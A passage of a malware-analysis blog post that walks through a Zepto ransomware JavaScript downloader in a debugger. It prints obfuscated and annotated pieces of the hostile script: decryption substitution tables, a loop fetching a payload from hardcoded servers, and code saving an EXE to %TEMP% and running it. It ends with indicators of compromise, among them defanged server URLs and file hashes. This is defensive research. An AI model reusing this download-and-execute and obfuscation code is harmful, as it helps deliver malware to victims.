+    Fm[Mn + (function Si() {
+        return Kj;
+    }())]();
+    return IGi2(Nt5);
+};
+
+
+function IGi2(SPz0) {
+    var ELs = new Array();
+
+    ELs[199] = 128;
+    ELs[252] = 129;
+    ELs[233] = 6 * 21 + 4;
+    ELs[9357 - 9131] = 58 * 2 + 15;
+    ELs[228] = 132;
+    ELs[224] = 133;
+    ELs[229] = 134;
+    ELs[231] = 135;
+    ELs[-9466 + 9700] = 136;
+    ELs[235] = 4 * 34 + 1;
+    ELs[232] = -9682 + 9820;
+    ELs[239] = 41 * 3 + 16;
+    ELs[-5635 + 5873] = 140;
+    ELs[-7222 + 7458] = 141;
+    ELs[196] = -5701 + 5843;
+    ELs[-4015 + 4212] = 143;
+    ELs[-3816 + 4017] = 144;
+    ELs[-5883 + 6113] = 145;
+    ELs[198] = 146;
+    ELs[244] = -9110 + 9257;
+    ELs[246] = 148;
+    ELs[5779 - 5537] = 149;
+    ELs[251] = 8372 - 8222;
+    ELs[-2482 + 2731] = 151;
+    ELs[255] = 152;
+    ELs[214] = 153;
+    ELs[5921 - 5701] = 154;
+    ELs[162] = 6050 - 5895;
+    ELs[163] = 45 * 3 + 21;
+    ELs[165] = -3966 + 4123;
+    ELs[8359] = 158;
+    ELs[402] = 159;
+    ELs[225] = 160;
+    ELs[237] = 161;
+    ELs[243] = 162;
+    ELs[250] = 163;
+    ELs[241] = 164;
+    ELs[49 * 4 + 13] = 165;
+    ELs[170] = 166;
+    ELs[186] = 167;
+    ELs[191] = 168;
+    ELs[8976] = 4730 - 4561;
+    ELs[172] = 170;
+    ELs[189] = 171;
+    ELs[188] = 76 * 2 + 20;
+    ELs[161] = 173;
+    ELs[171] = 174;
+    ELs[187] = 175;
+    ELs[9617] = 176;
+    ELs[9618] = 177;
+    ELs[9619] = 178;
+    ELs[9474] = 179;
+    ELs[9508] = 180;
+    ELs[9569] = 181;
+    ELs[9570] = 182;
+    ELs[9558] = 183;
+    ELs[9557] = 67 * 2 + 50;
+    ELs[9571] = 185;
+    ELs[11928 - 2375] = 186;
+    ELs[9559] = 187;
+    ELs[9565] = 188;
+    ELs[4435 * 2 + 694] = 45 * 4 + 9;
+    ELs[9563] = 190;
+    ELs[9488] = 191;
+    ELs[9492] = 192;
+    ELs[4218 * 2 + 1088] = 193;
+    ELs[9516] = 19 * 10 + 4;
+    ELs[9500] = 195;
+    ELs[9472] = 196;
+    ELs[9532] = 21 * 9 + 8;
+    ELs[-364 + 9930] = 198;
+    ELs[9567] = 199;
+    ELs[9562] = 200;
+    ELs[9556] = -999 + 1200;
+    ELs[9577] = 202;
+    ELs[9574] = 203;
+    ELs[9156 + 412] = 204;
+    ELs[803 * 11 + 719] = 205;
+    ELs[2247 * 4 + 592] = -2693 + 2899;
+    ELs[9575] = 207;
+    ELs[9576] = 208;
+    ELs[9572] = 209;
+    ELs[9573] = 210;
+    ELs[9561] = 211;
+    ELs[9560] = 212;
+    ELs[9554] = -4349 + 4562;
+    ELs[9555] = 1507 - 1293;
+    ELs[9579] = 54 * 3 + 53;
+    ELs[9578] = 216;
+    ELs[9496] = 217;
+    ELs[9484] = 8468 - 8250;
+    ELs[9608] = 61 * 3 + 36;
+    ELs[9604] = 220;
+    ELs[6568 + 3044] = 221;
+    ELs[17740 - 8124] = 222;
+    ELs[7778 + 1822] = 223;
+    ELs[945] = -6309 + 6533;
+    ELs[223] = 4611 - 4386;
+    ELs[915] = 226;
+    ELs[960] = 4308 - 4081;
+    ELs[931] = 228;
+    ELs[963] = -2657 + 2886;
+    ELs[181] = 230;
+    ELs[45 * 21 + 19] = 231;
+    ELs[934] = 232;
+    ELs[920] = 233;
+    ELs[937] = 234;
+    ELs[948] = 235;
+    ELs[8734] = 236;
+    ELs[966] = 237;
+    ELs[-3547 + 4496] = 238;
+    ELs[8745] = 239;
+    ELs[8801] = 25 * 9 + 15;
+    ELs[177] = 241;
+    ELs[8805] = 242;
+    ELs[8804] = 243;
+    ELs[3391 * 2 + 2210] = 244;
+    ELs[8993] = 245;
+    ELs[247] = 246;
+    ELs[1603 * 5 + 761] = 247;
+    ELs[176] = 248;
+    ELs[8729] = 1441 - 1192;
+    ELs[183] = 250;
+    ELs[8730] = 9336 - 9085;
+    ELs[8319] = 252;
+    ELs[178] = 253;
+    ELs[9632] = 254;
+    ELs[160] = 255;
+
+    var DAb4 = new Array();
+    for (var IBx3 = 0; IBx3 &lt; SPz0[Gp + Zx5]; IBx3++) {
+        var MOk3 = SPz0[DDy6 + Cv7 + Hs + Dx5](IBx3);
+        if (MOk3 &lt; (34 * 3 + 26)) {
+            var IVi2 = MOk3;
+        } else {
+            var IVi2 = ELs[MOk3];
+        }
+        DAb4[NVi6 + TUo](IVi2);
+    };
+
+    return DAb4;
+};
+
+
+function St(Nq) {
+    var HFw3 = new Array();
+
+    HFw3[-3955 + 4083] = 199;
+    HFw3[6335 - 6206] = 252;
+    HFw3[7192 - 7062] = 233;
+    HFw3[33 * 3 + 32] = -4163 + 4389;
+    HFw3[132] = 228;
+    HFw3[133] = 224;
+    HFw3[6082 - 5948] = 229;
+    HFw3[5748 - 5613] = 231;
+    HFw3[5888 - 5752] = 234;
+    HFw3[65 * 2 + 7] = 28 * 8 + 11;
+    HFw3[138] = -2035 + 2267;
+    HFw3[34 * 4 + 3] = 8268 - 8029;
+    HFw3[140] = 238;
+    HFw3[141] = 236;
+    HFw3[142] = 196;
+    HFw3[8950 - 8807] = 197;
+    HFw3[144] = 201;
+    HFw3[145] = 230;
+    HFw3[146] = 198;
+    HFw3[147] = 244;
+    HFw3[148] = 7229 - 6983;
+    HFw3[149] = -2439 + 2681;
+    HFw3[150] = 251;
+    HFw3[8045 - 7894] = 249;
+    HFw3[152] = -4938 + 5193;
+    HFw3[153] = 214;
+    HFw3[154] = -3269 + 3489;
+    HFw3[155] = -3982 + 4144;
+    HFw3[156] = 163;
+    HFw3[157] = 165;
+    HFw3[-2740 + 2898] = 8359;
+    HFw3[159] = 402;
+    HFw3[160] = 2228 - 2003;
+    HFw3[67 * 2 + 27] = 237;
+    HFw3[162] = 243;
+    HFw3[163] = -7982 + 8232;
+    HFw3[164] = 241;
+    HFw3[165] = 8657 - 8448;
+    HFw3[166] = 4272 - 4102;
+    HFw3[167] = 186;
+    HFw3[168] = -7694 + 7885;
+    HFw3[169] = 8120 + 856;
+    HFw3[-1832 + 2002] = 172;
+    HFw3[5075 - 4904] = 189;
+    HFw3[172] = 188;
+    HFw3[173] = 161;
+    HFw3[174] = 171;
+    HFw3[175] = 187;
+    HFw3[-8521 + 8697] = 9617;
+    HFw3[32 * 5 + 17] = 9618;
+    HFw3[178] = 812 * 11 + 687;
+    HFw3[179] = 18252 - 8778;
+    HFw3[180] = 1820 * 5 + 408;
+    HFw3[9913 - 9732] = 9569;
+    HFw3[182] = 9570;
+    HFw3[183] = 9558;
+    HFw3[-107 + 291] = 9557;
+    HFw3[185] = 3208 * 2 + 3155;
+    HFw3[186] = 9553;
+    HFw3[187] = 9559;
+    HFw3[188] = 9565;
+    HFw3[189] = 3363 + 6201;
+    HFw3[190] = 18276 - 8713;
+    HFw3[8855 - 8664] = 27 * 351 + 11;
+    HFw3[192] = 9492;
+    HFw3[-2320 + 2513] = 9524;
+    HFw3[1007 - 813] = 4041 + 5475;
+    HFw3[8784 - 8589] = 9500;
+    HFw3[196] = 9472;
+    HFw3[197] = 9532;
+    HFw3[198] = 9566;
+    HFw3[199] = 9567;
+    HFw3[200] = 9562;
+    HFw3[4799 - 4598] = 9556;
+    HFw3[-923 + 1125] = 9577;
+    HFw3[203] = 9574;
+    HFw3[204] = 9568;
+    HFw3[205] = 9552;
+    HFw3[206] = 2890 * 3 + 910;
+    HFw3[207] = 14545 - 4970;
+    HFw3[208] = 9576;
+    HFw3[209] = 9572;
+    HFw3[210] = 9573;
+    HFw3[211] = 9561;
+    HFw3[212] = 9560;
+    HFw3[213] = 9554;
+    HFw3[214] = 9555;
+    HFw3[-3753 + 3968] = 9579;
+    HFw3[-2431 + 2647] = 9578;
+    HFw3[-444 + 661] = 9496;
+    HFw3[218] = 11656 - 2172;
+    HFw3[219] = 9608;
+    HFw3[220] = 9604;
+    HFw3[-6025 + 6246] = 9612;
+    HFw3[222] = 9616;
+    HFw3[223] = 9600;
+    HFw3[224] = 3219 - 2274;
+    HFw3[225] = 10029 - 9806;
+    HFw3[-2242 + 2468] = 192 * 4 + 147;
+    HFw3[-3997 + 4224] = -1720 + 2680;
+    HFw3[61 * 3 + 45] = 931;
+    HFw3[229] = 963;
+    HFw3[-4668 + 4898] = 181;
+    HFw3[231] = 964;
+    HFw3[232] = 934;
+    HFw3[10054 - 9821] = 920;
+    HFw3[1108 - 874] = 937;
+    HFw3[-1041 + 1276] = 948;
+    HFw3[5983 - 5747] = -1091 + 9825;
+    HFw3[112 * 2 + 13] = 966;
+    HFw3[238] = 373 * 2 + 203;
+    HFw3[239] = 8745;
+    HFw3[240] = 8801;
+    HFw3[241] = 177;
+    HFw3[242] = 8805;
+    HFw3[243] = 8804;
+    HFw3[244] = 8992;
+    HFw3[245] = 8993;
+    HFw3[246] = 247;
+    HFw3[247] = 8776;
+    HFw3[114 * 2 + 20] = 176;
+    HFw3[249] = 8729;
+    HFw3[-1783 + 2033] = 183;
+    HFw3[33 * 7 + 20] = 8730;
+    HFw3[252] = 8319;
+    HFw3[89 * 2 + 75] = 5190 - 5012;
+    HFw3[254] = 9632;
+    HFw3[255] = 160;
+
+    var Ww = new Array();
+    var Gn2 = &quot;&quot;;
+    var IVi2;
+    var MOk3;
+    for (var IBx3 = 0; IBx3 &lt; Nq[Gp + Zx5]; IBx3++) {
+        IVi2 = Nq[IBx3];
+        if (IVi2 &lt; 128) {
+            MOk3 = IVi2;
+        } else {
+            MOk3 = HFw3[IVi2];
+        }
+        Ww.push(String[Wt3 + LJy(CJj4) + XTw](MOk3));
+    }
+
+    Gn2 = Ww[Lu + In4](&quot;&quot;);
+
+    return Gn2;
+};
+
+function OMb(GLq, Nq) {
+    var Fm = WScript[Tp5 + XIa + (function BCt() {
+        return Mf;
+    }())]((function PAw1() {
+        return Lh;
+    }()) + NWu9 + LUt5(RVm) + Kp9 + PTq + Ym + Dj0);
+    Fm[Tp] = IDz0;
+    Fm[Zn + ITb] = CJf2 /* n  */ ;
+    Fm[Oy1]();
+    Fm[BEs + NSy + DGz + (function RFu8() {
+        return NTs8;
+    }())](St(Nq));
+    Fm[GKj + ANb8 + Ds(GDa1)](GLq, 2);
+
+    Fm[Mn + Kj0(Kj)]();
+};
+</code></pre>
+
+<p>The best way to walk through this code is using Visual Studio:</p>
+
+<pre><code class="language-c">C:\temp&gt;cscript zepto.js //x
+</code></pre>
+
+<p>VS will set a breakpoint on the first line and wait for your input. The first big chunk of the code is initialization and obfuscation.</p>
+
+<p>All over the place you&rsquo;ll see functions that do this:</p>
+
+<pre><code class="language-javascript">function Rd(Lq1) {  
+    return Lq1;
+};
+</code></pre>
+
+<p>They just return whatever value is passed in. Instead of writing</p>
+
+<pre><code class="language-javascript">WScript[&quot;Sleep&quot;](2000);
+</code></pre>
+
+<p>you can obfuscate by replace it with</p>
+
+<pre><code class="language-javascript">var Xyz = &quot;eep&quot;;
+WScript[&quot;Sl&quot; + Rd(Xyz)](-4000 + 6000);
+</code></pre>
+
+<p>A good example of this is the <code>MSXML2.XMLHTTP</code> object creation:</p>
+
+<pre><code class="language-javascript">var Yz = [(function OQa() {
+    return Lm6;
+}()) + Rd(YMa2) + QYx4 + Kh, Nn0 + BFi + DQo + ABx + (function Cl1() {
+    return DAn2;
+}()) + FXo + VJu];
+
+for (var IBx3 = 1 * 0; IBx3 &lt; Yz[Gp + Zx5]; IBx3++) {
+    try {
+        var IGv7 = WScript[Tp5 + Ai(XIa) + Mf](Yz[IBx3]);
+        break;
+    } catch (e) {
+        continue;
+    }
+};
+</code></pre>
+
+<p>The <code>Yz</code> var looks confusing but really it&rsquo;s just a bunch of strings and anonymous functions returning strings glued together. If you substitute their values you end up with:</p>
+
+<pre><code class="language-javascript">var Yz = [(function OQa() {
+    return &quot;MSXM&quot;;
+}()) + Rd(&quot;L2.XM&quot;) + &quot;LHTT&quot; + &quot;P&quot;, &quot;WinH&quot; + &quot;ttp&quot; + &quot;.Wi&quot; + &quot;nHttp&quot; + (function Cl1() {
+    return &quot;Req&quot;;
+}()) + &quot;uest.&quot; + &quot;5.1&quot;];
+
+// and further simplified:
+var Yz = [&quot;MSXML2.XMLHTTP&quot;, &quot;WinHttp.WinHttpRequest.5.1&quot;];
+</code></pre>
+
+<p>You get the idea.</p>
+
+<p>The for loop following <code>Yz</code> creates an object that will eventually download the next stage in the infection. Nothing special here.</p>
+
+<p>What I&rsquo;m more interested in is the <code>do{}while();</code> loop just below that, so I&rsquo;ll set a breakpoint in VS:</p>
+
+<p><img src="https://bittherapy.net/images/2016/08/bp1.png" alt="" /></p>
+
+<p>Stepping through the code I can see <code>Lj4</code> being referenced in a GET request and iterated through with the do-while loop:</p>
+
+<pre><code class="language-javascript">...
+        if ((1 * 1) == Lp9) {
+            IGv7[Oy1](Np, Lj4[Gr++ % Lj4[Gp + Zx5]], false); // IGv7[&quot;open&quot;](&quot;GET&quot;, &quot;URLn&quot;, false); 
+            IGv7[AAd1](); // IGv7[&quot;send&quot;];
+        }
+
+        // if download failed, wait 100ms and try the next URL in Lj4[]
+        if (IGv7.readystate &lt; 4) { 
+            WScript[AUt + WZw + KSx](-2450 + 2550); // WScript[&quot;Sleep&quot;](100);
+            continue;
+        }
+...
+</code></pre>
+
+<p>Adding the <code>Lj4</code> array to the Watch list, I can view the contents:</p>
+
+<p><img src="https://bittherapy.net/images/2016/08/urls-1.png" alt="" /></p>
+
+<p>Great, I&rsquo;ll add these to the network block list.</p>
+
+<h3 id="payload-decryption">Payload Decryption</h3>
+
+<p>The binary is downloaded and written to disk but it is encrypted. The script will store it in <code>%TEMP%</code> with a random file name and no extension (yet).</p>
+
+<pre><code class="language-javascript">var Vi5 = JEc3.ExpandEnvironmentStrings(Pm0 + LPi2 + KTx); // expand '%TEMP%/'
+var El = Vi5 + Tm1 + (function CJx3() {  
+    return FAt8;
+}()) + IZr + ZLu; // 7eJ4XMIHWJarnl
+var Uw = El + Ty + Li0; // %TEMP%/7eJ4XMIHWJarnl.exe
+</code></pre>
+
+<p>Decryption begins with <code>DAb4</code> set after the download completes inside the do-while above:</p>
+
+<pre><code class="language-javascript">...
+        var DAb4 = HIi(El);
+        DAb4 = Kx1(DAb4);
+...
+</code></pre>
+
+<p>Within <code>HIi()</code>, the contents of the encrypted file are read into the <code>DAb4</code> variable using an <code>ADODB.Stream</code> object.</p>
+
+<h3 id="must-go-deeper">Must Go Deeper</h3>
+
+<p>Also inside <code>HIi()</code>, the first substitution function <code>IGi2()</code> is also called with the data read from disk.</p>
+
+<p><code>IGi2()</code> will iterate through every byte and if the char code is 128 or higher, it will replace it with a hardcoded value stored in a local variable <code>ELs[]</code>:</p>
+
+<pre><code class="language-javascript">function IGi2(SPz0) {  
+    var ELs = new Array();
+
+    ELs[199] = 128;
+    ... // a bunch more ELs[] data
+    ELs[160] = 255;
+
+    var DAb4 = new Array();
+    for (var IBx3 = 0; IBx3 &lt; SPz0[Gp + Zx5]; IBx3++) {
+        var MOk3 = SPz0[DDy6 + Cv7 + Hs + Dx5](IBx3);
+        if (MOk3 &lt; (34 * 3 + 26)) { // if the charcode is 0-127 keep it
+            var IVi2 = MOk3;
+        } else {
+            var IVi2 = ELs[MOk3]; // if charcode is 128+, replace with data from ELs[]
+        }
+        DAb4[NVi6 + TUo](IVi2); // push each byte 
+    };
+
+    return DAb4;
+};
+</code></pre>
+
+<p>You can see the execution state after the first decryption stage:
+<img src="https://bittherapy.net/images/2016/08/decryption1.PNG" alt="" /></p>
+
+<p><code>SPz0</code> is the content of the data on disk. In its current state, it is not a valid PE file (notice the lack of <code>MZ</code> magic bytes). Finally the <code>IGi2()</code> local array <code>DAb4</code> is returned and stored in another array with the same name but in the previous scope.</p>
+
+<p>The next step is to pass the (still) encrypted contents of <code>DAb4</code> to <code>Kx1()</code>, the main decryption routine.</p>
+
+<p>After some XOR and bit shifting, the decrypted payload is returned and stored back into <code>DAb4</code>.</p>
+
+<p>A few checks to see if decryption was successful are performed:</p>
+
+<pre><code class="language-javascript">...
+        // the binary expects to be between 100kb and 235kb
+        if (DAb4[Gp + Zx5] &lt; 100 * 1024 || DAb4[Gp + Av(Zx5)] &gt; 230 * 1024 || !XHw6(DAb4)) {
+            Lp9 = 1;
+            continue; //if something went wrong, retry everything
+        }
+        try {
+            OMb(Uw, DAb4); // all good? proceed to next stage
+        } catch (e) {
+            break;
+        };
+...
+</code></pre>
+
+<p>You can also see the <code>XHw6()</code> function which checks the first two bytes of the decrypted binary against <code>x4D\x5A</code> commonly known as <code>MZ</code>:</p>
+
+<p><img src="https://bittherapy.net/images/2016/08/check_for_MZ.PNG" alt="" /></p>
+
+<p>The next step will call <code>OMb()</code> which in turn will call the final substitution routine <code>St()</code>. It&rsquo;s job is to take another 127 bytes and replace them with hardcoded values stored in the local array <code>HFw3[]</code>:</p>
+
+<p><img src="https://bittherapy.net/images/2016/08/decryption2.PNG" alt="" /></p>
+
+<p>The local array <code>Ww</code> now holds the decrypted binary and is ready to be written to disk:</p>
+
+<pre><code class="language-javascript">...
+    Fm[BEs + NSy + DGz + (function RFu8() {
+        return NTs8;
+    }())](St(Nq)); // ADODB.Stream.WriteText()
+
+    // ADODB.Stream.SaveToFile(&quot;&quot;%TEMP%/7eJ4XMIHWJarnl.exe&quot;, adSaveCreateOverWrite)
+    Fm[GKj + ANb8 + Ds(GDa1)](GLq, 2);
+...
+</code></pre>
+
+<p>The final step will execute the binary from the <code>%TEMP%</code> folder with <code>323</code> as the argument:</p>
+
+<pre><code class="language-javascript">...
+        // WScript.Shell.Run(&quot;%TEMP%/7eJ4XMIHWJarnl.exe 323&quot;);
+        JEc3[DOo2 + Va0](Uw + (function FLv2() {
+            return GAb;
+        }())); 
+        break;
+...
+</code></pre>
+
+<p>The do-while main loop traps exceptions and if anything fails between <em>download</em> and <em>execute</em>, the script will wait 1 second and try the whole process again.</p>
+
+<pre><code class="language-javascript">var Lp9 = 1;
+...
+do {
+    ... // pick another URL
+    try {
+    ... // main loop
+    } catch (e) {
+        WScript[Ny6(AUt) + (function Em1() {
+            return WZw;
+        }()) + (function MPr8() {
+            return KSx;
+        }())](1000); // WScript[&quot;Sleep&quot;](1000);
+        continue;
+    };
+while (Lp9);
+</code></pre>
+
+<h3 id="iocs">IOCs</h3>
+
+<p>Hardcoded stage 1 servers</p>
+
+<pre><code class="language-nix">hxxp://regeneratewert.ws/1qvvu9lu
+hxxp://traveltotre.in/2c4ykij7
+hxxp://escapegasmech.com/048220y5
+hxxp://goldjinoz.com/0a3tg
+</code></pre>
+
+<p>Decrypted binary</p>
+
+<pre><code class="language-nix"># %TEMP%/7eJ4XMIHWJarnl.exe 
+MD5: 7F20DC4906319652A136C89369F77116
+SHA-256: F37B031056389AFD16A7FDD0A94D912100D1967FE0257963E5C6D7BFE0A2C6E3
+SSDeep: 3072:L/NMf5oDPD/pCxpH3JR9P2ev4q3k4N7dH0CzzslzpyZcaZV04:GhQjpwhbJkaAdy
+</code></pre>
+
+<p>Email attachment</p>
+
+<pre><code class="language-nix"># a4b985103f4.zip
+MD5: 26660D2A11B8DB76D28B4AFF5D08E34A
+SHA-256: 38D5E30D0282617D2398B9819B287A21B1DD897AC747656170BBE2D961B85B6E
+SSDeep: 192:yun3pWxM8gIW2HvNACkltcGmf/zDPS1uBpKJ4GG7NCwHeEvKSoehXNWWVq1Vwfk6:yun3pWxM0fHVAg7DPS1AqGhCwhZHZf3v
+</code></pre>
+
+<p>Stage 1 downloader</p>
+
+<pre><code class="language-nix"># business card 5a0fae48-.js
+MD5: 8A9F3577EC370FCBDFF0101B1B5798BE
+SHA-256: FDA2871DECA00EA0E7BB684165503525E06F2BD7D1313A9D5770D765B158A2F8
+SSDeep: 384:UGJVn6iUFUZGxx9djhEzJd0rQ8RioPkNKtzkJyjK4N0f2YblYxJib9Z8RMS3rlph:7zZGxx9VSz70Hjk+M4VF
+</code></pre>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  				<p>
+  					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://bittherapy.net/tags/malware">Malware</a></span><span class="tag"><a href="https://bittherapy.net/tags/reverse-engineering">Reverse Engineering</a></span><span class="tag"><a href="https://bittherapy.net/tags/malware-analysis">Malware Analysis</a></span><span class="tag"><a href="https://bittherapy.net/tags/zepto">Zepto</a></span><span class="tag"><a href="https://bittherapy.net/tags/ransomware">Ransomware</a></span>
+  				</p>
+  			</div>
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2019</span>
+            
+                <span><a href="https://bittherapy.net">Adrian</a></span>
+            
+            <span>{ bit.therapy }</span>
+            <span> <a href="https://bittherapy.net/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            ...
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://bittherapy.net/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>
+
+
+
+    </body>
+</html>
